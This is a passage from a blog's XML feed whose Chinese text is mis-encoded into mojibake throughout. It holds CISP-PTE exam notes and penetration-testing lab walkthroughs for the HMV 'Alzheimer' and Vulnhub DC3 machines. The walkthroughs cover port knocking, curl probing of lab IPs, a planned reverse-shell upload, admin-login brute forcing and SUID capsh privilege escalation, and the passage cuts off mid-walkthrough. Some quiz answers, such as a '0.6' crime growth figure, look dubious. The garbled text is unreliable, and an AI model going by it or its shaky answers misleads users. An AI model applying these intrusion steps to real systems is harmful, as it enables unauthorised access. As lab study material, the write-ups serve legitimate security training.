<li>è¦åœ¨oracleä¸‹æ‰§è¡Œjavaå­˜å‚¨è¿‡ç¨‹ï¼Œéœ€è¦å…·å¤‡<strong>javasyspriv</strong><ul>
<li>åœ¨ Oracle æ•°æ®åº“ä¸­ï¼Œä¸ºäº†å®‰å…¨èµ·è§ï¼Œå¯¹ Java çš„æƒé™è¿›è¡Œäº†ä¸¥æ ¼çš„åˆ’åˆ†ã€‚</li>
<li>connectÂ å’ŒÂ resourceÂ æ˜¯æœ€åŸºæœ¬çš„ç”¨æˆ·è§’è‰²ï¼Œåˆ†åˆ«ç”¨äºè¿æ¥å’Œåˆ›å»ºå¯¹è±¡ï¼Œæƒé™å¾ˆä½ã€‚</li>
<li>dbaÂ æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ï¼Œæ‹¥æœ‰æœ€é«˜æƒé™ï¼Œå½“ç„¶å¯ä»¥æ‰§è¡Œ Java å­˜å‚¨è¿‡ç¨‹ã€‚ä½†è¿™ä¸æ˜¯æ‰§è¡Œè¯¥æ“ä½œæ‰€éœ€çš„<strong>æœ€å°</strong>å’Œ<strong>æœ€ç‰¹å®š</strong>çš„è§’è‰²ã€‚</li>
<li><strong>javasyspriv</strong>Â æ˜¯ä¸€ä¸ªä¸“é—¨è®¾è®¡çš„è§’è‰²ï¼Œå®ƒçš„å…¨ç§°æ˜¯ â€œJava System Privilegeâ€ã€‚è¿™ä¸ªè§’è‰²æˆäºˆç”¨æˆ·åœ¨æ•°æ®åº“å†…éƒ¨çš„ Java è™šæ‹Ÿæœº(JVM)ä¸­æ‰§è¡Œä¸€äº›ç³»ç»Ÿçº§æ“ä½œçš„æƒé™ï¼Œä¾‹å¦‚è®¿é—®æ–‡ä»¶ç³»ç»Ÿã€æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ç­‰ã€‚åŠ è½½å’Œæ‰§è¡Œ Java å­˜å‚¨è¿‡ç¨‹é€šå¸¸éœ€è¦è¿™ä¸ªç‰¹å®šçš„æƒé™ã€‚</li>
</ul>
</li>
<li>ç³»ç»Ÿç–‘ä¼¼è¢«å…¥ä¾µï¼ŒæŸ¥çœ‹ç³»ç»Ÿç™»å½•æ—¥å¿—wtmp,æ­£ç¡®çš„å‘½ä»¤æ˜¯<code>last-f wtmp</code><ul>
<li>wtmpÂ æ–‡ä»¶ï¼ˆé€šå¸¸ä½äºÂ &#x2F;var&#x2F;log&#x2F;wtmpï¼‰æ˜¯ä¸€ä¸ª<strong>äºŒè¿›åˆ¶</strong>æ–‡ä»¶ï¼Œè®°å½•äº†ç”¨æˆ·çš„ç™»å½•å’Œæ³¨é”€å†å²ã€‚</li>
<li><strong>last</strong>Â å‘½ä»¤æ˜¯ä¸“é—¨ç”¨æ¥è§£æå’Œæ˜¾ç¤ºÂ wtmpÂ æ–‡ä»¶å†…å®¹çš„å·¥å…·ã€‚-fÂ å‚æ•°å…è®¸ä½ æŒ‡å®šè¦æŸ¥çœ‹çš„æ—¥å¿—æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é»˜è®¤çš„Â &#x2F;var&#x2F;log&#x2F;wtmp</li>
</ul>
</li>
<li>åœ¨linuxå®‰è£…åº”ç”¨ï¼Œå“ªä¸ªå‘½ä»¤ä¸éœ€è¦ â€“ Â <strong>.&#x2F;install</strong><ul>
<li>åœ¨ Linux ä¸‹ä»æºä»£ç ç¼–è¯‘å®‰è£…è½¯ä»¶ï¼Œæ ‡å‡†çš„Â <strong>GNU Autotools</strong>Â æµç¨‹æ˜¯ä¸‰éƒ¨æ›²ï¼š<ol>
<li><strong>.&#x2F;configure</strong>: æ£€æŸ¥ç³»ç»Ÿç¯å¢ƒï¼Œç”ŸæˆÂ MakefileÂ é…ç½®æ–‡ä»¶ã€‚</li>
<li><strong>make</strong>: æ ¹æ®Â MakefileÂ æ–‡ä»¶ï¼Œç¼–è¯‘æºä»£ç ï¼Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚</li>
<li><strong>make install</strong>: å°†ç¼–è¯‘å¥½çš„æ–‡ä»¶å’Œç›¸å…³èµ„æºå¤åˆ¶åˆ°ç³»ç»Ÿçš„æ ‡å‡†ç›®å½•ä¸­ã€‚</li>
</ol>
</li>
<li>.&#x2F;installÂ æˆ–Â .&#x2F;install.shÂ ä¸æ˜¯è¿™ä¸ªæ ‡å‡†æµç¨‹çš„ä¸€éƒ¨åˆ†ã€‚å®ƒæ˜¯ä¸€äº›è½¯ä»¶å¼€å‘è€…ä¸ºäº†ç®€åŒ–å®‰è£…è¿‡ç¨‹è€Œè‡ªå·±ç¼–å†™çš„<strong>è‡ªå®šä¹‰å®‰è£…è„šæœ¬</strong>ï¼Œå¹¶éé€šç”¨æˆ–å¿…éœ€çš„å‘½ä»¤ã€‚</li>
</ul>
</li>
<li>ä¸‹é¢å“ªä¸ªç±»å‹çš„rootkitæ˜¯è°ƒç”¨ç³»ç»Ÿçº§å‡½æ•°æ¥éšè—è‡ªå·± â€“ Â <strong>å†…æ ¸å±‚</strong><ul>
<li><strong>å†…æ ¸å±‚ Rootkit (Kernel-level Rootkit)</strong>Â æ˜¯æœ€å¼ºå¤§ã€æœ€éšè”½çš„ä¸€ç±»ã€‚å®ƒé€šè¿‡ä¿®æ”¹æ“ä½œç³»ç»Ÿçš„<strong>å†…æ ¸</strong>ä»£ç æˆ–å…³é”®æ•°æ®ç»“æ„ï¼ˆå¦‚ç³»ç»Ÿè°ƒç”¨è¡¨ã€ä¸­æ–­æè¿°ç¬¦è¡¨ï¼‰æ¥éšè—è‡ªèº«ã€‚å½“ä¸Šå±‚åº”ç”¨ï¼ˆå¦‚ä»»åŠ¡ç®¡ç†å™¨ã€lsÂ å‘½ä»¤ï¼‰é€šè¿‡<strong>ç³»ç»Ÿè°ƒç”¨</strong>æ¥æŸ¥è¯¢è¿›ç¨‹ã€æ–‡ä»¶ç­‰ä¿¡æ¯æ—¶ï¼Œè¢«ä¿®æ”¹è¿‡çš„å†…æ ¸ä¼šæ‹¦æˆªè¿™äº›è°ƒç”¨ï¼Œå¹¶å°†å…³äº Rootkit è‡ªèº«çš„ä¿¡æ¯ä»è¿”å›ç»“æœä¸­è¿‡æ»¤æ‰ã€‚</li>
<li>åº”ç”¨å±‚å’Œè¿è¡Œåº“å±‚ Rootkit çš„éšè—èƒ½åŠ›è¾ƒå¼±ï¼Œæ›´å®¹æ˜“è¢«æ£€æµ‹ã€‚</li>
</ul>
</li>
<li>ä»¥ä¸‹ä¸å±äºå®ç°æ•°æ®åº“å®‰å…¨æ€§çš„ä¸»è¦æŠ€æœ¯å’Œæ–¹æ³• â€“ Â <strong>å‡ºå…¥æœºæˆ¿ç­‰è®°æˆ–åŠ é”</strong><br>æ•°æ®åº“<strong>ç³»ç»Ÿå†…éƒ¨</strong>æä¾›çš„å®‰å…¨æŠ€æœ¯ï¼š<ul>
<li><strong>å­˜å–æ§åˆ¶ (Access Control):</strong>Â é€šè¿‡Â GRANT&#x2F;REVOKEÂ å®ç°ç”¨æˆ·æƒé™ç®¡ç†</li>
<li><strong>è§†å›¾ (View):</strong>Â é€šè¿‡åˆ›å»ºè§†å›¾ï¼Œå¯ä»¥å‘ç”¨æˆ·éšè—æŸäº›è¡Œæˆ–åˆ—ï¼Œå®ç°æ›´ç»†ç²’åº¦çš„è®¿é—®æ§åˆ¶ã€‚</li>
<li><strong>å®¡è®¡ (Auditing):</strong>Â è®°å½•å¯¹æ•°æ®åº“çš„æ“ä½œï¼Œç”¨äºäº‹åè¿½æº¯ã€‚</li>
</ul>
</li>
<li>å…¨å›½é¦–ä¾‹è®¡ç®—æœºå…¥ä¾µé“¶è¡Œç³»ç»Ÿæ˜¯é€šè¿‡<strong>å®‰è£…æ— é™MODEMè¿›è¡Œæ”»å‡»</strong></li>
<li>é»‘å®¢é€ æˆçš„ä¸»è¦å®‰å…¨éšæ‚£åŒ…æ‹¬ <strong>ç ´åç³»ç»Ÿã€çªƒå–ä¿¡æ¯åŠä¼ªé€ ä¿¡æ¯</strong></li>
<li>æ±Ÿæ³½æ°‘ä¸»å¸­æŒ‡å‡ºä¿¡æ¯æˆ˜çš„ä¸»è¦å½¢å¼æ˜¯<strong>ç”µå­æˆ˜å’Œè®¡ç®—æœºç½‘ç»œæˆ˜</strong></li>
<li>åœ¨åˆ¶å®šä»»ä½•å¤‡ä»½ç­–ç•¥ä¹‹å‰ï¼Œç¬¬ä¸€æ­¥æ°¸è¿œæ˜¯<strong>è¯†åˆ«å’Œå®šä¹‰å¤‡ä»½çš„èŒƒå›´</strong></li>
<li>ä¸ºäº†é˜²å¾¡ç½‘ç»œç›‘å¬ï¼Œæœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯ <strong>ä¿¡æ¯åŠ å¯†</strong></li>
<li>æœ€å°ç‰¹æƒåŸåˆ™ï¼š <strong>ä¸€ä¸ªäººæœ‰ä¸”ä»…æœ‰å…¶æ‰§è¡Œå²—ä½æ‰€è¶³å¤Ÿçš„è®¸å¯å’Œæƒé™</strong></li>
</ol>
<ul>
<li><strong>å²—ä½è½®æ¢</strong>  ç»„ç»‡æœºæ„å†…çš„æ•æ„Ÿå²—ä½ä¸èƒ½ç”±ä¸€ä¸ªäººé•¿æœŸè´Ÿè´£</li>
<li><strong>èŒè´£åˆ†ç¦»</strong>  å¯¹é‡è¦çš„å·¥ä½œè¿›è¡Œåˆ†è§£ï¼Œåˆ†è‡ªå·±ç»™ä¸åŒäººå‘˜å®Œæˆ</li>
</ul>
<ol>
<li>æˆ‘å›½çš„è®¡ç®—æœºå¹´çŠ¯ç½ªç‡çš„å¢é•¿æ˜¯<strong>0.6</strong></li>
<li>ä¿¡æ¯å®‰å…¨é£é™©ç¼ºå£æ˜¯æŒ‡Â <strong>ITçš„å‘å±•ä¸å®‰å…¨æŠ•å…¥ï¼Œå®‰å…¨æ„è¯†å’Œå®‰å…¨æ‰‹æ®µçš„ä¸å¹³è¡¡</strong></li>
<li>åº”æ€¥å°ç»„çš„ç®€ç§° <strong>CERT</strong>ã€‚CERT (Computer Emergency Response Team)</li>
<li>ä¸‹é¢å¯¹è®¿é—®æ§åˆ¶æŠ€æœ¯æè¿°æœ€å‡†ç¡®çš„æ˜¯ â€“ <strong>é˜²æ­¢å¯¹ç³»ç»Ÿèµ„æºçš„éæˆæƒè®¿é—®</strong><ul>
<li>è®¿é—®æ§åˆ¶æŠ€æœ¯é€šè¿‡ä¸€ç³»åˆ—æœºåˆ¶ï¼ˆå¦‚èº«ä»½è®¤è¯ã€æˆæƒå’Œå®¡è®¡ï¼Œå³AAAæ¨¡å‹ï¼‰æ¥ç¡®ä¿åªæœ‰åˆæ³•çš„ç”¨æˆ·ï¼ˆä¸»ä½“ï¼‰æ‰èƒ½ä»¥è¢«å…è®¸çš„æ–¹å¼è®¿é—®ç‰¹å®šçš„èµ„æºï¼ˆå®¢ä½“ï¼‰ã€‚å…¶æ ¹æœ¬ç›®çš„å°±æ˜¯<strong>é˜²æ­¢æœªç»æˆæƒçš„è®¿é—®å’Œä½¿ç”¨</strong>ã€‚</li>
<li>å¯é æ€§ã€å¯è¿½æŸ¥æ€§ã€å¯ä¿¡æ€§éƒ½æ˜¯å®‰å…¨çš„ç›®æ ‡ï¼Œä½†â€œé˜²æ­¢éæˆæƒè®¿é—®â€æ˜¯è®¿é—®æ§åˆ¶è¿™ä¸€<strong>æŠ€æœ¯æ‰‹æ®µ</strong>æœ€ç›´æ¥ã€æœ€å‡†ç¡®çš„æè¿°ã€‚</li>
</ul>
</li>
<li>å®Œæ•´æ€§æœºåˆ¶å¯ä»¥é˜²èŒƒä»¥ä¸‹å“ªç§æ”»å‡»  â€“ <strong>æ•°æ®ä¼ è¾“ä¸­è¢«ç¯¡æ”¹æˆ–ç ´å</strong></li>
<li>é€šå¸¸ä¸€ä¸ªä¸‰ä¸ªå­—ç¬¦çš„å£ä»¤ç ´è§£éœ€è¦<strong>18ç§’</strong> </li>
<li>é€šè¿‡å£ä»¤ä½¿ç”¨ä¹ æƒ¯è°ƒæŸ¥å‘ç°æœ‰å¤§çº¦___%çš„äººä½¿ç”¨é•¿åº¦ä½äº5ä¸ªå­—ç¬¦çš„å£ä»¤</li>
<li><strong>é»‘è‰²æ˜ŸæœŸå››</strong> æŒ‡çš„æ˜¯<strong>1998å¹´11æœˆ3æ—¥æ˜ŸæœŸå››</strong></li>
<li><strong>æ•°æ®æ‰€æœ‰è€…</strong> è´Ÿæœ‰å†³å®šä¿¡æ¯åˆ†ç±»çº§åˆ«çš„è´£ä»»<ul>
<li>ç”¨æˆ· (User): æ•°æ®çš„æœ€ç»ˆä½¿ç”¨è€…ã€‚</li>
<li>å®¡è®¡å‘˜ (Auditor): è´Ÿè´£æ£€æŸ¥å®‰å…¨ç­–ç•¥çš„æ‰§è¡Œæƒ…å†µã€‚</li>
<li>å®‰å…¨å‘˜ (Security Officer): è´Ÿè´£æä¾›å®‰å…¨å»ºè®®ã€å®æ–½å’Œç»´æŠ¤å®‰å…¨æ§åˆ¶æªæ–½ï¼Œä½†æœ€ç»ˆçš„å®šçº§å†³ç­–æƒåœ¨æ‰€æœ‰è€…æ‰‹ä¸­ã€‚</li>
</ul>
</li>
<li>ç½‘ç»œå®‰å…¨åœ¨å¤šç½‘åˆä¸€æ—¶ä»£çš„è„†å¼±æ€§ä½“ç°åœ¨<strong>ç®¡ç†çš„è„†å¼±æ€§</strong></li>
<li>æ“ä½œç³»ç»Ÿæ‰“è¡¥ä¸å’Œç³»ç»Ÿå‡çº§æ˜¯ä»¥ä¸‹å“ªç§é£é™©æ§åˆ¶æªæ–½ <strong>é™ä½é£é™©</strong><ul>
<li><strong>é™ä½é£é™© (Risk Mitigation&#x2F;Reduction):</strong>Â é‡‡å–æªæ–½æ¥å‡å°‘æ¼æ´æˆ–å‡å°æ”»å‡»æˆåŠŸåçš„å½±å“ã€‚æ‰“è¡¥ä¸ä¿®å¤äº†å·²çŸ¥çš„æ¼æ´ï¼Œç›´æ¥é™ä½äº†ç³»ç»Ÿè¢«åˆ©ç”¨çš„å¯èƒ½æ€§ï¼Œè¿™æ˜¯æœ€å…¸å‹çš„é™ä½é£é™©æªæ–½ã€‚</li>
<li>è§„é¿é£é™©ï¼šåœæ­¢ä½¿ç”¨è¯¥ç³»ç»Ÿæˆ–åŠŸèƒ½ã€‚</li>
<li>è½¬ç§»é£é™©ï¼šè´­ä¹°ç½‘ç»œå®‰å…¨ä¿é™©ã€‚</li>
<li>æ¥å—é£é™©ï¼šå·²çŸ¥é£é™©ä½†å†³å®šä¸é‡‡å–ä»»ä½•æªæ–½ã€‚</li>
</ul>
</li>
<li>å…³äºä¿¡æ¯ä¿éšœï¼š</li>
</ol>
<ul>
<li>A ä¿¡æ¯å®‰å…¨ä¿éšœæ˜¯ä¸€ä¸ªå®¢è§‚åˆ°ä¸»è§‚çš„è¿‡ç¨‹ï¼Œå³é€šè¿‡é‡‡å–æŠ€æœ¯ã€ç®¡ç†ã€å·¥ç¨‹ç­‰æ‰‹æ®µï¼Œå¯¹ä¿¡æ¯èµ„æºçš„ä¿å¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§æä¾›ä¿æŠ¤ï¼Œä»è€Œç»™ä¿¡æ¯ç³»ç»Ÿæ‰€æœ‰è€…ä»¥ä¿¡å¿ƒ </li>
<li>ä¿¡æ¯å®‰å…¨ä¿éšœçš„éœ€æ±‚æ˜¯ç”±ä¿¡æ¯å®‰å…¨ç­–ç•¥æ‰€å†³å®šçš„ï¼Œæ˜¯è‡ªä¸Šè€Œä¸‹çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå†³ç­–è€…çš„èƒ½åŠ›å’Œå†³å¿ƒéå¸¸é‡è¦</li>
<li>ä¿¡æ¯ç³»ç»Ÿå®‰å…¨å¹¶ä¸è¿½æ±‚ä¸‡æ— ä¸€å¤±ï¼Œè€Œæ˜¯è¦æ ¹æ®èµ„é‡‘é¢„ç®—ï¼Œåšåˆ°é‡åŠ›è€Œè¡Œ</li>
</ul>
<ol start="24">
<li>WindowsNTæä¾›çš„åˆ†å¸ƒå¼å®‰å…¨ç¯å¢ƒåˆè¢«ç§°ä¸º<strong>åŸŸ(Domain)</strong><ul>
<li><strong>åŸŸ (Domain)</strong>Â æ˜¯ Windows Server (æºäº NT) æä¾›çš„ä¸€ç§<strong>é›†ä¸­å¼</strong>ç®¡ç†æ¨¡å‹ã€‚åœ¨ä¸€ä¸ªåŸŸä¸­ï¼Œæ‰€æœ‰çš„ç”¨æˆ·è´¦æˆ·ã€è®¡ç®—æœºè´¦æˆ·å’Œå®‰å…¨ç­–ç•¥éƒ½å­˜å‚¨åœ¨åä¸º<strong>æ´»åŠ¨ç›®å½• (Active Directory)</strong>Â çš„ä¸­å¤®æ•°æ®åº“ä¸­ã€‚è¿™ä½¿å¾—ç®¡ç†å‘˜å¯ä»¥å¯¹æ•´ä¸ªç½‘ç»œè¿›è¡Œç»Ÿä¸€çš„ã€åˆ†å¸ƒå¼çš„å®‰å…¨ç®¡ç†ã€‚</li>
<li>å·¥ä½œç»„ (Workgroup) æ˜¯ä¸€ç§å¯¹ç­‰çš„ã€<strong>éé›†ä¸­å¼</strong>çš„ç®¡ç†æ¨¡å‹ï¼Œæ¯å°è®¡ç®—æœºå„è‡ªç®¡ç†è‡ªå·±çš„è´¦æˆ·ã€‚</li>
</ul>
</li>
<li>Â Apacheè§£æè§„åˆ™<strong>ä»å³å‘å·¦</strong></li>
<li>ä¼šè¯å›ºå®šå½¢æˆçš„åŸå› æ˜¯<strong>æˆåŠŸæ³¨å†Œåï¼Œä¼šè¯IDæ²¡æœ‰è½®è½¬</strong><ul>
<li><strong>ä¼šè¯å›ºå®š (Session Fixation)</strong>Â æ”»å‡»çš„æ ¸å¿ƒæ˜¯ï¼šæ”»å‡»è€…åœ¨ç”¨æˆ·ç™»å½•<strong>ä¹‹å‰</strong>ï¼Œå°±å¼ºåˆ¶ç”¨æˆ·ä½¿ç”¨ä¸€ä¸ªæ”»å‡»è€…å·²çŸ¥çš„ Session IDã€‚å½“ç”¨æˆ·ç”¨è¿™ä¸ª Session ID æˆåŠŸç™»å½•åï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ª ID æ¥å†’å……ç”¨æˆ·ã€‚</li>
<li>è¿™ä¸ªæ¼æ´çš„<strong>æ ¹æœ¬åŸå› </strong>æ˜¯ï¼ŒWebåº”ç”¨åœ¨ç”¨æˆ·æˆåŠŸè®¤è¯ï¼ˆç™»å½•ï¼‰åï¼Œ<strong>æ²¡æœ‰åºŸå¼ƒæ—§çš„ä¼šè¯IDï¼Œå¹¶é‡æ–°ç”Ÿæˆä¸€ä¸ªæ–°çš„ã€å®‰å…¨çš„ä¼šè¯ID</strong>ã€‚è¿™ä¸ªè¡Œä¸ºè¢«ç§°ä¸º<strong>ä¼šè¯IDè½®è½¬ (Session ID Regeneration)</strong></li>
</ul>
</li>
<li>Â IIS PUTæ¼æ´å­˜åœ¨ Â <strong>IIS6.0</strong></li>
</ol>
<p>Â </p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
        <category>cisp-pte</category>
      </categories>
      <tags>
        <tag>cisp-pte</tag>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Alzheimer</title>
    <url>/posts/16384.html</url>
    <content><![CDATA[<p>HMV-Alzheimeré¶åœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679a35f1d0e0a243d4f878cb.png"></p>
<h1 id="Alzheimer"><a href="#Alzheimer" class="headerlink" title="Alzheimer"></a>Alzheimer</h1><h2 id="ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†"><a href="#ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ç«¯å£æ‰«æ&#x2F;ä¿¡æ¯æ”¶é›†"></a>ç«¯å£æ‰«æ&#x2F;ä¿¡æ¯æ”¶é›†</h2><p> <img src="https://pic1.imgdb.cn/item/679a400bd0e0a243d4f87a4b.png"><br>ä¸‰ä¸ªç«¯å£  åªæœ‰21ç«¯å£ç°åœ¨æ˜¯å¼€æ”¾çš„  80å’Œ22éƒ½æ˜¯æœ‰é˜²ç«å¢™<br>å…ˆå°è¯•èƒ½ä¸èƒ½åŒ¿åç™»å½•ftp  ç„¶åä¸Šä¼ åå¼¹shellæ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/679a4010d0e0a243d4f87a4c.png"><br>å‘ç°æœ‰ä¸€ä¸ª.secretnote.txt ä¸‹è½½åˆ°æœ¬åœ°æŸ¥çœ‹<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4d.png"><br>æç¤ºæˆ‘ä»¬è¦ç”¨knockæœåŠ¡ æŒ‰è¿™ä¸ªé¡ºåºå‘é€è¯·æ±‚åŒ…æ‰èƒ½æ‰“å¼€ç«¯å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">â”Œâ”€â”€(rootã‰¿kakeru)-[~/alz]</span></span><br><span class="line"><span class="string">â””â”€#</span> <span class="string">knock</span> <span class="string">-u</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.125</span> <span class="number">1000 </span><span class="number">2000 </span><span class="number">3000</span></span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯æ•²é—¨ä¹‹åè¿˜æ˜¯æ— æ³•æ‰“å¼€ä¸¤ä¸ªç«¯å£  æŸ¥äº†wp  å‘ç°å’Œæ©˜å¢¨å¤§ä½¬çš„é—®é¢˜ä¸€æ · å› ä¸ºæˆ‘ä¿®æ”¹è¿‡ç½‘å¡ï¼Œæ‰€ä»¥å»ä¿®æ”¹é¶æœºçš„knockdé…ç½®æ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4e.png" alt="|500"><br><code>service knockd restart</code><br><img src="https://pic1.imgdb.cn/item/679a403ed0e0a243d4f87a59.png"><br>ä¿®æ”¹é…ç½®æ–‡ä»¶ä¹‹ååœ¨knockå°±å¯ä»¥è®¿é—®80ç«¯å£äº†</p>
<h2 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h2><p><img src="https://pic1.imgdb.cn/item/679a403fd0e0a243d4f87a5a.png"><br>æç¤ºå¯†ç å­˜åœ¨ä¸€ä¸ª.txtæ–‡ä»¶ä¸­  ç”¨æˆ·åæ˜¯ medusa   å¹¶ä¸”ç»™äº†ä¸€ä¸ªæ‘©ä¸å¯†ç  nothing<br>ç°åœ¨è¿›è¡Œç›®å½•æ‰«æ<br><img src="https://pic1.imgdb.cn/item/679a4044d0e0a243d4f87a5b.png"><br>è¿™é‡Œç»™äº†ä¸‰ä¸ªé‡å®šå‘çš„ç›®å½• ä¸€æ¬¡è®¿é—®è¯•è¯•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/alz]</span><br><span class="line">â””â”€<span class="comment"># curl 192.168.240.224/secret/</span></span><br><span class="line">Maybe my password is in this secret folder?</span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/alz]</span><br><span class="line">â””â”€<span class="comment"># curl 192.168.240.224/home/ Â </span></span><br><span class="line">Maybe my pass is at home!</span><br><span class="line">-medusa</span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/alz]</span><br><span class="line">â””â”€<span class="comment"># curl 192.168.240.224/admin/</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span></span><br><span class="line"><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>403 Forbidden<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span></span><br><span class="line"><span class="variable">&lt;body bgcolor=&quot;white&quot;&gt;</span></span><br><span class="line"><span class="variable">&lt;center&gt;</span><span class="variable">&lt;h1&gt;</span>403 Forbidden<span class="variable">&lt;/h1&gt;</span><span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;hr&gt;</span><span class="variable">&lt;center&gt;</span>nginx/1.14.2<span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;/body&gt;</span></span><br><span class="line"><span class="variable">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>æç¤ºå¯†ç åœ¨secretç›®å½•ä¸­ åˆåœ¨æ–‡ä»¶homeä¸­æ‰€ä»¥è®¿é—®&#x2F;secret&#x2F;home&#x2F;</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/alz]</span><br><span class="line">â””â”€<span class="comment"># curl 192.168.240.224/secret/home/</span></span><br><span class="line"></span><br><span class="line">Im trying a lot. Im sure <span class="keyword">that</span> i will recover <span class="keyword">my</span> pass!</span><br><span class="line"></span><br><span class="line">-medusa</span><br></pre></td></tr></table></figure></div>
<p>è¿˜æ˜¯æ²¡æœ‰ç›´æ¥çš„å¯†ç <br>æ²¡æœ‰æ€è·¯æŸ¥çœ‹wpåæ‰çŸ¥é“å¯†ç è—åœ¨ftpé‡Œé¢ ä½†æ˜¯æ˜¯åœ¨knockä¹‹åè¿‡çš„ftpä¸­  è¿™ä¸ªè€å…­ã€‚ã€‚ã€‚<br><img src="https://pic1.imgdb.cn/item/679a4045d0e0a243d4f87a5d.png"><br>è¿™ä¸ªå°±æ˜¯medusaçš„å¯†ç <br><img src="https://pic1.imgdb.cn/item/679a4047d0e0a243d4f87a5e.png"><br>æ‹¿åˆ°shell</p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p><img src="https://pic1.imgdb.cn/item/679a407ed0e0a243d4f87a61.png"><br>å‘ç°æœ‰sudoå‘½ä»¤  ä½†æ˜¯è¿™ä¸ªæ— æ³•ææƒ<br>ç»§ç»­æŸ¥suidæ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/679a4083d0e0a243d4f87a64.png"><br>æœç´¢éƒ½å¯ä»¥ç”¨capshææƒ<br><img src="https://pic1.imgdb.cn/item/679a407fd0e0a243d4f87a62.png"><br><img src="https://pic1.imgdb.cn/item/679a4082d0e0a243d4f87a63.png"><br>æ‹¿åˆ°flag</p>
<p>å¯†ç å­˜åœ¨knockä¹‹åçš„ftpçš„æ–‡ä»¶ä¸­ä¹Ÿå¤ªé˜´é™©äº†ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>DC3é¶åœºå¤ç›˜</title>
    <url>/posts/35983.html</url>
    <content><![CDATA[<p>vulnhub-DC3é¶åœºå¤ç›˜</p>
<span id="more"></span>
<h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p><img src="https://pic1.imgdb.cn/item/679a237dd0e0a243d4f8768f.png" alt="|450"><br>nmapæ‰«æè¿™ä¸ªç«¯å£ä¹‹å å¯ä»¥å¾—åˆ°ä¸€äº›æ›´é‡è¦çš„ä¿¡æ¯   æ¯”å¦‚è¿™ä¸ªç½‘ç«™ç”¨çš„cmsæ˜¯joomla<br>ç”¨searchsploitå¯ä»¥å‘ç°æœ‰éå¸¸å¤šçš„æ¼æ´  ç™¾åº¦ä¹‹åå‘ç°æœ‰ä¸€ä¸ªæ‰«æå™¨ joomscan</p>
<h2 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h2><p><img src="https://pic1.imgdb.cn/item/679a237ed0e0a243d4f87690.png" alt="|450"><br>webç•Œé¢åªæœ‰ä¸€ä¸ªç™»å½•ç•Œé¢ å¯ä»¥å°è¯•ç›´æ¥çˆ†ç ´ ä½†æ˜¯ä»ç»“æœæ¥è¯´ ç¡®å®å¯ä»¥çˆ†ç ´ è€Œä¸”è´¦æˆ·ä¹Ÿå­˜åœ¨<br>ä½†æ˜¯è¿™é‡Œä¸æ˜¯å®é™…çš„ç®¡ç†ç•Œé¢<br><img src="https://pic1.imgdb.cn/item/679a237ed0e0a243d4f87691.png"><br>ç”¨joomscanå¯ä»¥æ‰¾åˆ°çœŸå®çš„ç®¡ç†å‘˜ç™»å½•ç•Œé¢   æˆ‘ä»¬ç”¨password.lst çˆ†ç ´å¯ä»¥å¾—åˆ°å¯†ç <br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87692.png" alt="|475"><br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87693.png" alt="|500"><br>è¿™ä¸ªç®¡ç†ç•Œé¢æ²¡æœ‰å¯ä»¥æ³¨å…¥çš„ç‚¹<br><img src="https://pic1.imgdb.cn/item/679a23e3d0e0a243d4f8769b.png" alt="|475"><br>åœ¨æ¨¡æ¿ä¸­ å¯ä»¥çœ‹åˆ°phpæ–‡ä»¶ 